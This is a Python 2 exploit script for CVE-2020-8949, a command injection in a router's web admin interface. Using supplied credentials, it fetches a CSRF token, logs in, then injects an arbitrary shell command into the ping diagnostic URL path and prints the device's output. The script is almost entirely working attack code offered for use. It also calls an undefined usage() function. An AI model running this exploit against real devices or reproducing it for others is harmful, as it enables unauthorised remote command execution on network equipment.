import re
import sys
import time
import getopt
import requests

from pwn import *
from termcolor import colored, cprint
from img2banner.img2banner import covertImageToAscii


def banner():
    # conver img to banner
    aimg = covertImageToAscii("logo.png", 80, 0.43, True, debug=False) 
    print colored("\n".join(aimg), 'red', attrs=["dark"])
    print ""
    print colored("\t\tSpecial thanks for the author(s) of this CVE (CVE-2020-8949): @linuxmonr4", "blue")


def main():
    try:
        opts, args = getopt.getopt(sys.argv[1:], "ht:c:r:vq", ["help", "output="])
    except getopt.GetoptError as err:
        # print help information and exit:
        print(err) # will print something like "option -a not recognized"
        usage()
        sys.exit(2)
    output = None
    verbose = False
    target = None
    run = None
    quiet = False
    username, password = None, None
    for o, a in opts:
        if o == "-v":
            verbose = True
        elif o in ("-q", "--quiet"):
            quiet = True
        elif o in ("-h", "--help"):
            usage()
            sys.exit()
        elif o in ("-r", "--run"):
            run = a
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-c", "--creds"):
            if ":" not in a:
                log.error("Wrong formatted credentials. ':' not present!")
                sys.exit(2)
            username, password = a.split(":",1)
        else:
            assert False, "unhandled option"
    if not target:
        log.warn("Target missing! Use '-t'")
        sys.exit(2)
    if not username or not password:
        log.warn("Credentials missing! Use '-c'")
        sys.exit(2)
    if not quiet:
        banner()


    s = requests.Session()
    data = ""
    if not quiet:
        p = log.progress('Working')
        p.status('Getting csrf')
    r = s.get(target + "/cgi-bin/webui/admin")
    t = re.findall(r"name=\"csrftoken\" value=\"(.*?)\"", r.text)
    if not t:
        log.warn("CSRF Token not found!")
        sys.exit(3)
    csrf = t.pop()
    timestamp = int(time.time())
    data = {
            "username": username,
            "password": password,
            "timestamp": timestamp,
            "csrftoken": csrf
    }
    time.sleep(1)
    if not quiet:
        p = log.progress('Working')
        p.status("Logging in with '{}:{}'".format(username, password))
    r = s.post(target + "/cgi-bin/webui/admin", data=data)
    time.sleep(1)
    if not quiet:
        p = log.progress('Working')
        p.status("Running Command '{}'".format(run))
    r = s.get(target + "/cgi-bin/webui/admin/tools/app_ping/diag_ping/;{};/5/56/baidu.com".format(run))

    output = "\n".join(r.text.split("\n")[:-2])
    print output



if __name__ == "__main__":
    main()
